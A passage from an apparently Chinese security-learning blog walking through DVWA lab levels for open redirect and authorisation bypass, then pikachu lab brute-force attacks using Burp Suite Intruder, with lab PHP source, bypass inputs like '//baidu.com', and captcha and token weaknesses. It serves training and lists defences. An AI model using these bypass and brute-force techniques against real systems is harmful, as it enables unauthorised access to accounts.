class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>漏洞复现：<br>未作任何处理我们直接在参数中拼接<a target="_blank" rel="noopener" href="http://xxx.com/">http://xxx.com</a>即可重定向<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-15-55-14.png" alt="找位置" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-15-57-02.png" alt="成功跳转" class="lazyload"></p>
<p><strong>medium</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (array_key_exists (<span class="hljs-string">&quot;redirect&quot;</span>, <span class="hljs-variable">$_GET</span>) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>] != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (preg_match (<span class="hljs-string">&quot;/http:\/\/|https:\/\//i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>])) &#123;<br>        http_response_code (<span class="hljs-number">500</span>);<br>        <span class="hljs-meta">?&gt;</span><br>        &lt;p&gt;Absolute URLs not allowed.&lt;/p&gt;<br>        <span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        header (<span class="hljs-string">&quot;location: &quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>]);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><br>http_response_code (<span class="hljs-number">500</span>);<br><span class="hljs-meta">?&gt;</span><br>&lt;p&gt;Missing redirect target.&lt;/p&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">exit</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>漏洞复现：<br>这里使用正则对<a href="http://">http://</a>和<a href="https://">https://</a>头进行检验我们可以让他访问本地的一些文件如phpinfo页面<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-16-19-28.png" alt="访问本地" class="lazyload"><br>也可以使用相对网址将页面带到百度将http:或者https去掉直接使用//baidu.com<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-16-28-44.png" alt="跳转" class="lazyload"></p>
<p><strong>high</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (array_key_exists (<span class="hljs-string">&quot;redirect&quot;</span>, <span class="hljs-variable">$_GET</span>) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>] != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>], <span class="hljs-string">&quot;info.php&quot;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        header (<span class="hljs-string">&quot;location: &quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>]);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        http_response_code (<span class="hljs-number">500</span>);<br>        <span class="hljs-meta">?&gt;</span><br>        &lt;p&gt;You can only redirect to the info page.&lt;/p&gt;<br>        <span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><br>http_response_code (<span class="hljs-number">500</span>);<br><span class="hljs-meta">?&gt;</span><br>&lt;p&gt;Missing redirect target.&lt;/p&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">exit</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>漏洞复现：<br>这里使用strpos函数检测参数中是否有info.php我们可以在参数中添加一个变量指定info.php来绕过<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-16-02-08.png" alt="绕过" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-16-02-31.png" alt="成功跳转" class="lazyload"></p>
<p><strong>impossible</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">?php<br><br><span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-keyword">if</span> (array_key_exists (<span class="hljs-string">&quot;redirect&quot;</span>, <span class="hljs-variable">$_GET</span>) &amp;&amp; is_numeric(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">switch</span> (intval (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;info.php?id=1&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;info.php?id=2&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">99</span>:<br>            <span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;https://digi.ninja&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$target</span> != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>        header (<span class="hljs-string">&quot;location: &quot;</span> . <span class="hljs-variable">$target</span>);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-meta">?&gt;</span><br>        Unknown redirect target.<br>        <span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br>Missing redirect target.<br></code></pre></td></tr></table></figure>

<p>系统不接受页面或 URL 作为重定向目标，而是使用 ID 值来告知重定向页面重定向到的位置。这会将系统限制为只能重定向到它知道的页面，因此攻击者无法修改内容以转到他们选择的页面。</p>
<h2 id="DVWA-–-Authorisation-Bypass"><a href="#DVWA-–-Authorisation-Bypass" class="headerlink" title="DVWA – Authorisation Bypass"></a>DVWA – Authorisation Bypass</h2><p>在这里个人理解为越权</p>
<p><strong>Low</strong><br>源码中啥都没<br>毫无防备<br>漏洞复现：<br>我们换一个权限低的账号直接访问被隐藏的管理源才能访问的页面直接访问到<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-16-49-07.png" alt="low越权" class="lazyload"></p>
<p><strong>medium</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Only the admin user is allowed to access this page.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Have a look at these two files for possible vulnerabilities: </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">* vulnerabilities/authbypass/get_user_data.php</span><br><span class="hljs-comment">* vulnerabilities/authbypass/change_user_details.php</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">if</span> (dvwaCurrentUser() != <span class="hljs-string">&quot;admin&quot;</span>) &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Unauthorised&quot;</span>;<br>    http_response_code(<span class="hljs-number">403</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>在这里只限定了对html页面的访问但我们直接访问数据页面呢<br>漏洞复现：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-17-02-34.png" alt="中级访问" class="lazyload"></p>
<p><strong>high</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Only the admin user is allowed to access this page.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Have a look at this file for possible vulnerabilities: </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">* vulnerabilities/authbypass/change_user_details.php</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">if</span> (dvwaCurrentUser() != <span class="hljs-string">&quot;admin&quot;</span>) &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Unauthorised&quot;</span>;<br>    http_response_code(<span class="hljs-number">403</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>HTML 页面和用于检索数据的 API 都已被锁定，但是跟新数据我们可以使用一下看看<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-17-42-18.png" alt="成功越权" class="lazyload"></p>
<p>成功越权使用了管理员的更新功能。</p>
<h2 id="DVWA-学习总结"><a href="#DVWA-学习总结" class="headerlink" title="DVWA 学习总结"></a>DVWA 学习总结</h2><p>学习完发现还需要学习很多知识才能完全理解漏洞原理，仍需要多复习和巩固，将欠缺的知识继续补充完整。仍有一些关卡没有复现需要查阅资料进行学习。</p>

            
        </article>
    </div>
    
    <div class="nexmoe-post">
        <a href="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/">
            
                <div class="nexmoe-post-cover mdui-ripple" style="padding-bottom: 66.66666666666666%;"> 
                    <img data-src="/assets/background.gif" data-sizes="auto" alt="pikachu靶场的学习" class="lazyload">
                    <h1>pikachu靶场的学习</h1>
                </div>
            
        </a>

        <div class="nexmoe-post-meta nexmoe-rainbow">
            <a><i class="nexmoefont icon-calendar-fill"></i>2023年03月06日</a>
            <a><i class="nexmoefont icon-areachart"></i>19.3k 字</a>
            <a><i class="nexmoefont icon-time-circle-fill"></i>大概 82 分钟</a>
        </div>

        <article>
            
                <h1 id="pikachu靶场的学习"><a href="#pikachu靶场的学习" class="headerlink" title="pikachu靶场的学习"></a>pikachu靶场的学习</h1><h2 id="pikachu介绍"><a href="#pikachu介绍" class="headerlink" title="pikachu介绍"></a>pikachu介绍</h2><p>pikachu是一个网络安全学习的靶场，集合了常见web安全的漏洞，很适合初学者进行学习。</p>
<p>pikachu靶场下载链接为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs reStructuredText">https://github.com/zhuifengshaonianhanlu/pikachu<br></code></pre></td></tr></table></figure>

<h2 id="pikachu靶场的搭建"><a href="#pikachu靶场的搭建" class="headerlink" title="pikachu靶场的搭建"></a>pikachu靶场的搭建</h2><p>首先下载安装phpstudy，从下载链接中下载好pikachu源码，解压到phpstudy的www目录下，完成配置与初始化即可。</p>
<p>安装可参考这篇文章：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs reStructuredText">https://blog.csdn.net/weixin_42474304/article/details/117533788<br></code></pre></td></tr></table></figure>

<h2 id="pikachu靶场实战练习"><a href="#pikachu靶场实战练习" class="headerlink" title="pikachu靶场实战练习"></a>pikachu靶场实战练习</h2><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>简单来说就是尝试不同的用户名和密码来进行尝试去碰撞真是存在的用户和密码，人工尝试是不可能快速的实现，所以要基于工具自动化来帮我们快速猜出账号和密码。暴力破解=连续尝试+字典+自动化。</p>
<p>字典是暴力破解中的重中之重，一本好的字典可以大大提高破解速度：</p>
<ul>
<li>常用的账号密码（弱口令）</li>
<li>互联网上被脱裤后的账号密码（社工库）</li>
<li>对网站管理者进行信息收集，利用收集的信息实用密码生成工具进行密码字典的生成。</li>
</ul>
<p>一个网站理论上在攻击者有足够强大的计算能力和时间的前提下都是可以被暴力破解拿到网站的后台管理权限。所以我们对一个web系统存在暴力破解漏洞一般指的是该web系统没有采用或采用了较弱的安全策略，从而导致被暴力破解的可能性高。这里安全策略包括：</p>
<ol>
<li><p>是否要求用户设置复杂的密码</p>
</li>
<li><p>是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp</p>
</li>
<li><p>是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等</p>
</li>
<li><p>是否采用了双因素认证</p>
<p>..等等</p>
</li>
</ol>
<p>存在暴力破解漏洞的网站会遭到暴力破解但成功的可能性并不是100%。</p>
<h4 id="暴力破解的流程"><a href="#暴力破解的流程" class="headerlink" title="暴力破解的流程"></a>暴力破解的流程</h4><ol>
<li><p>确认是否存在暴力破解漏洞：确认目标是否存在暴力破解的可能性，如抓包观察验证元素和response信息，判断暴力破解可能性。</p>
</li>
<li><p>对字典的配置：</p>
<p>根据实际情况对字典配置提高暴破成功率：</p>
<ul>
<li>根据注册信息进行优化，对目标站点进行注册，搞清账号密码限制，如：用户名密码长度，字母数字组合，按照此要求去除字典中不符合要求的密码</li>
<li>如暴破管理后台，往往网站模板默认的管理员账号（admin、administrator、root）的机率比较大，可以使用这三个账号加密码进行尝试登录，观察返回结果确定用户名</li>
</ul>
<p>如：提示用户名密码错误则两项都错，提示密码错误则用户名正确只对密码进行暴破</p>
</li>
<li><p>自动化工具的使用：</p>
<p>配置自动化工具（时间、线程、重试次数、ip等），进行自动化操作，常用的工具有burpsuite</p>
</li>
</ol>
<h4 id="基于表单的暴力破解流程和配置工具过程"><a href="#基于表单的暴力破解流程和配置工具过程" class="headerlink" title="基于表单的暴力破解流程和配置工具过程"></a>基于表单的暴力破解流程和配置工具过程</h4><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/1.jpg" alt="基于表单暴力破解靶场" class="lazyload"><br>测试目标：pikachu靶场的表单暴力破解<br>测试工具：burpsuite抓包工具(<a target="_blank" rel="noopener" href="https://portswigger.net/burp/download.html">https://portswigger.net/burp/download.html</a>)</p>
<p>进行简单的登录尝试：(会提示用户名和密码不存在)登录失败<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-08-16-17-20.png" alt="登录尝试" class="lazyload"><br>在burp抓到的包中我们可以看到是一个post请求<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-08-16-29-43.png" alt="抓取数据包" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-08-16-33-49.png" alt="查看数据包内容" class="lazyload"><br>可以在intercept中看到所抓的包的最后一行有用户名a密码为a<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-08-16-41-08.png" alt="响应数据包" class="lazyload"><br>正常的响应返回登录失败的页面<br>选中这条post请求右键并发送到intruder中<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-08-16-45-33.png" alt="发送到intruder中" class="lazyload"><br>在选项卡中选中intruder选项，清楚原始数据包中的变量，然后选中用户名和密码点击Add$将其设置为变量<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-08-16-50-31.png" alt="清楚变量" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-08-16-59-26.png" alt="添加变量" class="lazyload"><br>在攻击模式选项中(attack type)中有四种模式：</p>
<ul>
<li>Sniper模式逻辑：先将第一个变量也就是用户名替换，第二个变量不动。当第一个变量替换完之后，对第二个变量进行依次替换。直白一点就是说一个变，另外一个不变，第一个变完，变第二个。</li>
<li>Battering ram模式逻辑：所有变量进行同时同样的替换。就是说你变我也变，你变什么我也变什么。</li>
<li>Pitchfork模式逻辑：所有变量同时替换，但是各自变量替换各自的字典，同时进行，但是互不相干。替换时第一个变量的第一替换值对应第二个变量的第一个替换值，不进行排列组合，就是1对1，2对2。不会将密码进行随机的排列组合。</li>
<li>Cluster bomb模式逻辑：与Pitchfork模式逻辑类似，不同点是Cluster bomb模式会进行随机的排列组合。</li>
</ul>
<p>在这里我们选择Cluster bomb模式进行暴破，在Payloads中配置第一个变量和第二个变量的字典，这里可以手动输入添加，也可以在系统中添加已经写好的字典。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-08-17-18-03.png" alt="配置" class="lazyload"><br>添加字典后进行攻击，根据返回数据包的长度进行判断是否成功。为了方便观察也可以Options选项中的grep-match中删除原有字符串，添加username or password is not exists，burp就会将所有含有此字符串的数据包flag出来。没有被flag出的数据包则是我们破解成功的数据包。点击username or password is not exists进行排序，没有勾选的则表明破解成功，有勾选的则表明破解失败。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-08-17-35-28.png" alt="攻击结果" class="lazyload"><br>用成功破解的用户名：admin 密码：123456登录，login success：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-08-17-37-29.png" alt="验证" class="lazyload"></p>
<h4 id="暴力破解之不安全的验证码分析—on-client—on-server"><a href="#暴力破解之不安全的验证码分析—on-client—on-server" class="headerlink" title="暴力破解之不安全的验证码分析—on client—on server"></a>暴力破解之不安全的验证码分析—on client—on server</h4><p><strong>验证码的作用：</strong> 防止登录暴力破解、防止机器恶意注册账号<br><strong>验证码的认证流程：</strong></p>
<ul>
<li><p>客户端请求登录页面后端生成验证码：</p>
<ol>
<li>后端使用算法生成图片，并将图片响应给客户端</li>
<li>同时将算法生成的值全局赋值存到SESSION中</li>
</ol>
</li>
<li><p>校验验证码：</p>
<ol>
<li>客户端将信息和验证码一起提交</li>
<li>后端对提交的验证码和session中的验证码值比较</li>
</ol>
</li>
<li><p>客户端刷新页面，生成新的验证码：<br>验证码生成的算法中包含随机生成函数，每次刷新重新生成</p>
</li>
</ul>
<h5 id="只在前端验证的验证码（on-client）"><a href="#只在前端验证的验证码（on-client）" class="headerlink" title="只在前端验证的验证码（on client）"></a>只在前端验证的验证码（on client）</h5><p>打开靶场，随便输入用户名和密码，加上正确的验证码，并用burp抓包<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-14-39-04.png" alt="登录信息" class="lazyload"><br>提示登录失败页面刷新验证码更新<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-14-40-08.png" alt="验证码刷新" class="lazyload"><br>抓包信息<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-14-45-25.png" alt="抓包信息" class="lazyload"><br>查看源码可以看到验证码是在前端生成并且验证也在前端<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-14-51-55.png" alt="生成和验证验证码" class="lazyload"><br>将数据包发送到repeater模块中判断后端是否对验证码进行了校验，修改数据包中验证码的值，点击go可以看到返回的页面只有用户名和密码错误并没有验证码错误的提示<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-14-57-39.png" alt="验证是否有后台检验" class="lazyload"><br>这可以判定这个验证码的验证方式为前端验证并没有后验证，是通过JavaScript实现的验证码，对于不懂安全的人来说，可以起到一定的防范作用。但对于知道这个原理的人来说形同虚设。然后的操作就和基于表单的流程一样，发送数据包到Intruder中，选用Cluster bomb模式修改变量，因为验证码后台并不校验没有用，所以只用选择用户名与密码。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-03-29.png" alt="暴破" class="lazyload"><br>配置字典开始暴破，通过长度排序找到正确的用户名和密码<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-08-49.png" alt="暴破过程" class="lazyload"><br>输入用户名密码和正确的验证码登录成功<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-11-44.png" alt="登录成功" class="lazyload"><br><strong>（on-client）这种方式存在的问题：</strong></p>
<ul>
<li>使用前端js实现验证码(纸老虎)</li>
<li>将验证码在cookie中泄露,容易被获取</li>
<li>将验证码在前端源代码中泄露，容易被获取</li>
</ul>
<h5 id="在后端校验的验证码（on-server）"><a href="#在后端校验的验证码（on-server）" class="headerlink" title="在后端校验的验证码（on server）"></a>在后端校验的验证码（on server）</h5><p>同样的在靶场中随机输入用户名和密码输入正确的验证码，并抓包<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-17-44.png" alt="输入信息" class="lazyload"><br>登录失败验证码发生变化<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-18-55.png" alt="验证码变化" class="lazyload"><br>将该数据包发送到repeater中修改验证码查看返回页面信息（改为空提示验证码不能为空）<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-24-17.png" alt="验证码不能为空" class="lazyload"><br>随便输入验证码提示验证码错误<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-26-08.png" alt="验证码错误" class="lazyload"><br>经过判断发现后端对验证码进行了判断，这样是否就没有问题了？显然不是这样，从表面上看没有问题，但是我们还需要对验证码是否在后台过期进行进一步验证。首先先点击验证码，获取一个新的验证码，并将其记下来。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-31-16.png" alt="获取新验证码" class="lazyload"><br>然后将返回数据包中输入正确的验证码点击go，提示用户名和密码不存在<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-34-12.png" alt="返回数据包" class="lazyload"><br>为了验证验证码是否一致有效，我们修改用户名和密码，验证码不变，点击运行，结果一样。说明验证码可以重复利用。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-35-40.png" alt="验证码是否可重复利用" class="lazyload"><br>将数据包发送到Intruder，设置变量用户名和密码，验证码则输入正确的验证码，不设置变量。输入字典进行破解。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-39-20.png" alt="配置字典" class="lazyload"><br>长度排序找出正确的用户名和密码<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-40-51.png" alt="查找用户名密码" class="lazyload"><br>登录成功<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-41-55.png" alt="登录成功" class="lazyload"></p>
<p><strong>（on-server）这种方式存在的问题：</strong></p>
<ul>
<li>验证码在后台不过期，导致可以长期被使用</li>
<li>验证码校验不严格,逻辑出现问题</li>
<li>验证码设计的太过简单和有规律,容易被猜解</li>
</ul>
<h4 id="token防暴破？"><a href="#token防暴破？" class="headerlink" title="token防暴破？"></a>token防暴破？</h4><p>Token在计算机身份认证中是令牌（临时）的意思，在词法分析中是标记的意思。一般作为邀请、登录系统使用。<br>一个token实例</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//生成一个token，以当前的时间＋一个5位的前缀</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set_token</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(isset($_SESSION[<span class="hljs-string">&#x27;token&#x27;</span>]))&#123;<br>        unset($_SESSION[<span class="hljs-string">&#x27;token&#x27;</span>]);<br>        &#125;<br>        $_SESSION[<span class="hljs-string">&#x27;token&#x27;</span>]=str_replace(<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,uniqid(mt_rand(<span class="hljs-number">10000</span>,<span class="hljs-number">99999</span>),<span class="hljs-literal">true</span>));<br>  &#125;<br></code></pre></td></tr></table></figure>

<p>一般的做法：</p>
<ol>
<li>将token以”type=‘hidden’’”的形式输出在表单中</li>
<li>在提交的认证的时候一起提交，并在后台对其进行校验<br>由于其token值输出在了前端源码中,容易被获取,因此也就失去了防暴力破解的意义。一般Token在防止CSRF上会有比较好的功效，具体讲在CSRF漏洞章节进行讲解</li>
</ol>
<h4 id="暴力破解常见的防范措施"><a href="#暴力破解常见的防范措施" class="headerlink" title="暴力破解常见的防范措施"></a>暴力破解常见的防范措施</h4><ul>
<li>设计安全的验证码(安全的流程+复杂而又可用的图形)</li>
<li>对认证错误的提交进行计数并给出限制,比如连续5次密码错误,锁定2小时</li>
<li>必要的情况下，使用双因素认证</li>
</ul>
<h3 id="xss（跨站脚本攻击）"><a href="#xss（跨站脚本攻击）" class="headerlink" title="xss（跨站脚本攻击）"></a>xss（跨站脚本攻击）</h3><ul>
<li>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：反射型xss、存储型xss、dom型xss。</li>
<li>XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。</li>
<li>XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。</li>
<li>XSS漏洞可以用来进行钓鱼攻击、钓鱼攻击、前端js挖矿、用户cookie获取。甚至可以结合浏览器自身的漏洞对用户主机进行远程控制等。</li>
</ul>
<h4 id="xss-窃取cookie-攻击流程"><a href="#xss-窃取cookie-攻击流程" class="headerlink" title="xss(窃取cookie)攻击流程"></a>xss(窃取cookie)攻击流程</h4><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-13-16-47.png" alt="xss流程" class="lazyload"></p>
<h4 id="xss漏洞分类及攻击流程"><a href="#xss漏洞分类及攻击流程" class="headerlink" title="xss漏洞分类及攻击流程"></a>xss漏洞分类及攻击流程</h4><p><strong>xss分为（危害排序）：</strong> 存储型&gt;反射型&gt;dom型</p>
<ol>
